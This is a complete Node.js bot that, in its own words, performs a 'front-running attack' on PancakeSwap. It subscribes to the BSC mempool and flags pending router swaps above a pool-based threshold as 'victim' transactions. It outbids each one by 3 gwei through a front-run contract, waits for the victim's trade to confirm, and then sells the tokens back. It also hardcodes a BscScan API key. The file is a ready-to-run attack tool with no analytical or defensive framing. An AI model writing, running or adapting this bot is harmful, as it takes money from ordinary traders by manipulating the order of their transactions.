/**
 * Perform a front-running attack on pancakeswap
*/
var Web3 = require('web3');
var abiDecoder = require('abi-decoder');
var colors = require("colors");
var Tx = require('ethereumjs-tx').Transaction;
var axios = require('axios');
var BigNumber = require('big-number');

const {PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, FRONT_RUN_ADDRESS,PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI,
     PANCAKE_POOL_ABI, FRONT_RUN_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK} = require('./constants.js');

const {PRIVATE_KEY} = require('./privateKey.js');
const {TOKEN_ADDRESS_ARRAY, RATION_ARRAY} = require('./tokenList.js');
const INPUT_TOKEN_ADDRESS = '0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c';

const ONE_GWEI = 1e9;

var web3;
var web3Ws;
var pancakeRouter;
var pancakeFactory;
var subscription;
var bnbTokenInfo;
var frontRunContract;
successFrontBuy = false;




var TOKENDIC = {};

async function createWeb3(){
    try {
        web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
        pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
        pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
        abiDecoder.addABI(PANCAKE_ROUTER_ABI);

        frontRunContract = new web3.eth.Contract(
            FRONT_RUN_ABI,
            FRONT_RUN_ADDRESS
        );

        return true;
    } catch (error) {
      console.log(error);
      return false;
    }
}

async function main() {
    try {   
            if (await createWeb3() == false) {
                console.log('Web3 Create Error'.yellow);
                process.exit();
            }
            
            const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
            var ret= await prepareTokenInfo(user_wallet);
            if(!ret){
                process.exit();
            }

        
            

            targetTokenAddrs = Object.keys(TOKENDIC);

            var log_str = '***** Pending Transaction Snipe *****'
            console.log(log_str.green);

            subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
            })
            .on('open',()=>{
                console.log('The websocket connection is open');
            })
            .on("data", async function (transactionHash) {
                let transaction = await web3Ws.eth.getTransaction(transactionHash);
                if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
                {
                    await handleTransaction(transaction,targetTokenAddrs, user_wallet);
                }
            })
            .on('close',()=>{
                console.log('The websocket connection was closed')
            })

    } catch (error) {
        console.log(error.toString());
        process.exit();
    }
}

  
async function handleTransaction(transaction,targetTokenAddrs,user_wallet) {
    var tokenAddr = await triggerToParseTx(transaction,targetTokenAddrs);
    if(tokenAddr!=null){
        await triggerToAttackTx(transaction,tokenAddr,user_wallet)
    }
}
    

async function triggerToParseTx(transaction,targetTokenAddrs) {
    try{
        let data = parseTx(transaction['input']);
        let method = data[0];
        let params = data[1];
        let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

        
        if(method == 'swapExactETHForTokens')
        {
            let txInAmount = transaction.value;
            let txPath = params[1].value;
            let txOutTokenAddr = txPath[txPath.length-1];

            if(!targetTokenAddrs.includes(txOutTokenAddr))
            {
                return null;
            } 
            updatePoolInfo(txOutTokenAddr);
            console.log('-----------------------------------------------------------------------------------------------------'.yellow);
            let tokenDetail = TOKENDIC[txOutTokenAddr];
            let poolInfo = tokenDetail['poolInfo'];
            let tokenInfo = tokenDetail['tokenInfo'];
            let log_str = "swap ExactETH For Tokens" + '\t' +'Threshold: '+(poolInfo.thresholdAmount/(10**18)).toFixed(3) + ' ' + 'BNB' + '\t' +'Total: '+ (poolInfo.bnbBalance/(10**18)).toFixed(3) + ' ' + 'BNB'+'\t'+'Target: '+tokenInfo.symbol;
            console.log(log_str.green);

            log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (txInAmount/(10**18)).toFixed(3) + '\t' + 'BNB' 
            if(txInAmount >= poolInfo.thresholdAmount && txInAmount<poolInfo.thresholdAmount *5)
            {
                console.log(log_str.red);
                return txOutTokenAddr;
            }   
            console.log(log_str);
        }
        else if (method == 'swapETHForExactTokens'){

            let txInMax = transaction.value;
            let txPath = params[1].value;
            let txOutTokenAddr = txPath[txPath.length-1];

            if(!targetTokenAddrs.includes(txOutTokenAddr))
            {
                return null;
            } 
            updatePoolInfo(txOutTokenAddr);
            console.log('-----------------------------------------------------------------------------------------------------'.yellow);
            let tokenDetail = TOKENDIC[txOutTokenAddr];
            let poolInfo = tokenDetail['poolInfo'];
            let tokenInfo = tokenDetail['tokenInfo'];
            let log_str = "swap ETH For ExactTokens" + '\t' +'Threshold: '+(poolInfo.thresholdAmount/(10**18)).toFixed(3) + ' ' + 'BNB' + '\t' +'Total: '+ (poolInfo.bnbBalance/(10**18)).toFixed(3) + ' ' + 'BNB'+'\t'+'Target: '+tokenInfo.symbol;
            console.log(log_str.green);
            
            log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (txInMax/(10**18)).toFixed(3) + '\t' + 'BNB' + '(max)' 
            if(txInMax >= poolInfo.thresholdAmount && txInMax<poolInfo.thresholdAmount *5)
            {
                console.log(log_str.red);
                return txOutTokenAddr;
            }   
            console.log(log_str);
        }
        else if(method == 'swapExactTokensForTokens')
        {
            let txOutMin = params[1].value;
            let txPath = params[2].value;
            let txOutTokenAddr = txPath[txPath.length-1];

            if(!targetTokenAddrs.includes(txOutTokenAddr))
            {
                return null;
            } 
            updatePoolInfo(txOutTokenAddr);
            let amounts = await pancakeRouter.methods.getAmountsOut(txOutMin.toString(), [txOutTokenAddr,INPUT_TOKEN_ADDRESS]).call();
            console.log('-----------------------------------------------------------------------------------------------------'.yellow);
            let calcEth = amounts[1];
            let tokenDetail = TOKENDIC[txOutTokenAddr];
            let poolInfo = tokenDetail['poolInfo'];
            let tokenInfo = tokenDetail['tokenInfo'];
            let log_str = "swap ExactTokens For Tokens" + '\t' +'Threshold: '+(poolInfo.thresholdAmount/(10**18)).toFixed(3) + ' ' + 'BNB' + '\t' +'Total: '+ (poolInfo.bnbBalance/(10**18)).toFixed(3) + ' ' + 'BNB'+'\t'+'Target: '+tokenInfo.symbol;
            console.log(log_str.green);

            log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calcEth/(10**18)).toFixed(3) + '\t' + 'BNB' + '(min)';
            
            if(calcEth >= poolInfo.thresholdAmount && calcEth<poolInfo.thresholdAmount *5)
            {
                console.log(log_str.red);
                return txOutTokenAddr;
            }   
            console.log(log_str);
        }
        else if(method == 'swapTokensForExactTokens')
        {
            let txOutAmount = params[0].value;
            
            let txPath = params[2].value;
            let txOutTokenAddr = txPath[txPath.length-1];

            if(!targetTokenAddrs.includes(txOutTokenAddr))
            {
                return null;
            } 
            updatePoolInfo(txOutTokenAddr);
            let amounts = await pancakeRouter.methods.getAmountsOut(txOutAmount.toString(), [txOutTokenAddr,INPUT_TOKEN_ADDRESS]).call();
            console.log('-----------------------------------------------------------------------------------------------------'.yellow);
            var calcEth = amounts[1];
            let tokenDetail = TOKENDIC[txOutTokenAddr];
            let poolInfo = tokenDetail['poolInfo'];
            let tokenInfo = tokenDetail['tokenInfo'];
            let log_str = "swap Tokens For ExactTokens " + '\t' +'Threshold: '+(poolInfo.thresholdAmount/(10**18)).toFixed(3) + ' ' + 'BNB' + '\t' +'Total: '+ (poolInfo.bnbBalance/(10**18)).toFixed(3) + ' ' + 'BNB'+'\t'+'Target: '+tokenInfo.symbol;
            console.log(log_str.green);
            log_str = transaction['hash'] +'\t' + gasPrice.toFixed(2) + '\tGWEI\t' + (calcEth/(10**18)).toFixed(3) + '\t' + 'BNB' + '(max)';
            
            if(calcEth >= poolInfo.thresholdAmount && calcEth<poolInfo.thresholdAmount*5)
            {
                console.log(log_str.red);
                return txOutTokenAddr;
            }   
            console.log(log_str);
        } 
        return null;

    }catch(error)
    {
        console.log(error.toString());
        return null;
    }
}

async function triggerToAttackTx(transaction,tokenAddr,user_wallet){
    if(subscription!=null){
        subscription.unsubscribe();
    }
    var log_str = '***** Start to Front Run Special Pending TX *****'
    console.log(log_str.red);

    try{
        console.log('Perform front running attack...');

        let gasPrice = parseInt(transaction['gasPrice']);
        let newGasPrice = gasPrice + 3*ONE_GWEI;
        console.log('Victim Tx gas price: '+ gasPrice/ONE_GWEI);
        console.log('New Front Tx gas price: '+ newGasPrice/ONE_GWEI);

        await eth2Tokens(user_wallet,tokenAddr,newGasPrice);
        
        console.log(new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '')+' waiting for victim tx confirm'.yellow)
        //waiting victim tx confirmed
        while (await isPendingTx(transaction['hash'])) {
        }
        
        console.log(new Date().toISOString().replace(/T/, ' ').replace(/\..+/, '')+' victim tx has confirmed'.yellow)
        
        await token2Eth(user_wallet,tokenAddr,gasPrice+1*ONE_GWEI);

        console.log('finised front run attack!!!');
        
    }catch(error){
        console.log(error.toString());
    }    
}

function parseTx(input) {
    try{
        if (input == '0x')
            return ['0x', []]

        let decodedData = abiDecoder.decodeMethod(input);
        let method = decodedData['name'];
        let params = decodedData['params'];

        return [method, params];
    }catch(error){
        console.log(error);
        return [null,null];
    }

}

async function isPendingTx(transactionHash) {
    return await web3.eth.getTransactionReceipt(transactionHash) == null;
}

async function eth2Tokens(user_wallet,tokenAddr,gasPrice){
	try{
		var reqTX ={
					from: user_wallet.address,
					to: FRONT_RUN_ADDRESS,
					gas: 5000000,
					gasPrice: gasPrice,
					data: frontRunContract.methods.ethToToken(tokenAddr).encodeABI()
			}

		var signedTX = await user_wallet.signTransaction(reqTX);
		var transactionHash = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
		var receipt = await web3.eth.getTransactionReceipt(transactionHash);
		console.log('eth2Tokens Tx: '+ receipt)

	}catch(error){
		console.log(error.toString());
	}
}

async function token2Eth(user_wallet,tokenAddr,gasPrice){
	try{
		var reqTX ={
					from: user_wallet.address,
					to: FRONT_RUN_ADDRESS,
					gas: 5000000,
					gasPrice: gasPrice,
					data: frontRunContract.methods.tokenToEth(tokenAddr).encodeABI()
			}

		var signedTX = await user_wallet.signTransaction(reqTX);
		var transactionHash = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
		var receipt = await web3.eth.getTransactionReceipt(transactionHash);
		console.log('token2Eth Tx: '+ receipt)

	}catch(error){
		console.log(error.toString());
	}
}

async function prepareTokenInfo(user_wallet){
    try{
        var log_str = '***** Your Wallet Information *****'
        console.log(log_str.green);
        log_str = 'wallet address:\t' + user_wallet.address;
        console.log(log_str.white);

        var wallet_balance = await web3.eth.getBalance(user_wallet.address);
        log_str = 'Wallet:'+'\t'+(wallet_balance/(10**18)).toFixed(5) +'\t'+'BNB';
        console.log(log_str);

        var contract_balance =await web3.eth.getBalance(FRONT_RUN_ADDRESS);
        console.log('Contract:'+'\t'+ (contract_balance/(10**18)).toFixed(5)+'\t'+'BNB'); 

        var log_str = '***** Your Output Token Information *****'
        console.log(log_str.green);

        for(var i=0;i<TOKEN_ADDRESS_ARRAY.length;i++){
            var tokenAddr = TOKEN_ADDRESS_ARRAY[i];
            var ration = RATION_ARRAY[i];
            var tokenABIReq = 'https://api.bscscan.com/api?module=contract&action=getabi&address='+tokenAddr+'&apikey=UBF988MHCNUXD5IZ9J5BJBF9GZUSC9CCTV';
            var tokenInfo = await getTokenInfo(tokenAddr, tokenABIReq, user_wallet);    
            if(tokenInfo == null) {
              process.exit();
            }
            var poolInfo = await getPoolInfo(INPUT_TOKEN_ADDRESS, tokenAddr,ration)
            if(poolInfo == null) {
                process.exit();
            }
            var tokenDetail = {
                'ration':ration,
                'tokenInfo':tokenInfo,
                'poolInfo':poolInfo
            }
            log_str =tokenInfo.symbol+' : '+poolInfo.tokenBalance/10**tokenInfo.decimals+' | '+poolInfo.bnbBalance/10**18+' BNB'
            console.log(log_str);
            
            TOKENDIC[tokenAddr] = tokenDetail;
        }

        return true;

    }catch(error){
        console.log('Failed to Prepare BNB & Token Info '+error.toString())
        return false;
    }
    

}

async function updatePoolInfo(tokenAddr) {
    try{
        var tokenDetail = TOKENDIC[tokenAddr];
        var poolInfo = tokenDetail['poolInfo']

        var reserves = await poolInfo.contract.methods.getReserves().call();

        if(poolInfo.forward) {
            var eth_balance = reserves[0];
            var token_balance = reserves[1];
        } else {
            var eth_balance = reserves[1];
            var token_balance = reserves[0];
        }
        poolInfo.bnbBalance = eth_balance;
        poolInfo.tokenBalance = token_balance;
        poolInfo.thresholdAmount = eth_balance * (tokenDetail.ration); 
        return true;

    }catch (error) {
        console.log('Failed To Update Pool Info'.yellow);
        return false;
    }
}

async function getTokenInfo(tokenAddr, tokenABIReq, user_wallet) {
    try{
        var response = await axios.get(tokenABIReq);
        if(response.data.status==0)
        {
            console.log('Invalid Token Address !')   
            return null;
        }   
        var tokenAbi = response.data.result;
        var tokenContract = new web3.eth.Contract(JSON.parse(tokenAbi), tokenAddr);
        var balance = await tokenContract.methods.balanceOf(user_wallet.address).call();
        var decimals = await tokenContract.methods.decimals().call();
        var symbol =  await tokenContract.methods.symbol().call();
        return {'contract': tokenContract, 'balance': balance, 'symbol': symbol, 'decimals': decimals}
    }catch(error){
        console.log('Failed Get Token Info '+ error.toString());
        return null;
    }
}

async function getPoolInfo(inputTokenAddr, outTokenAddr,ration){
    try{
        var poolAddress = await pancakeFactory.methods.getPair(inputTokenAddr, outTokenAddr).call();
        if(poolAddress == '0x0000000000000000000000000000000000000000')
        {
            log_str = 'PanCake has no pair';
            console.log(log_str.yellow);
            return null;
        }   
        var poolContract = new web3.eth.Contract(PANCAKE_POOL_ABI, poolAddress);
        var reserves = await poolContract.methods.getReserves().call();

        var token0Address = await poolContract.methods.token0().call();
    
        if(token0Address == inputTokenAddr) {
            var forward = true;
            var bnbBalance = reserves[0];
            var tokenBalance = reserves[1];
        } else {
            var forward = false;
            var bnbBalance = reserves[1];
            var tokenBalance = reserves[0];
        }

        var thresholdAmount = bnbBalance * ration;
        return {'contract': poolContract, 'forward': forward, 'bnbBalance': bnbBalance, 'tokenBalance': tokenBalance, 'thresholdAmount': thresholdAmount}

    }catch(error){
        console.log('Error: Get Pair Info '+error.toString());
        return null;
    }
}

main();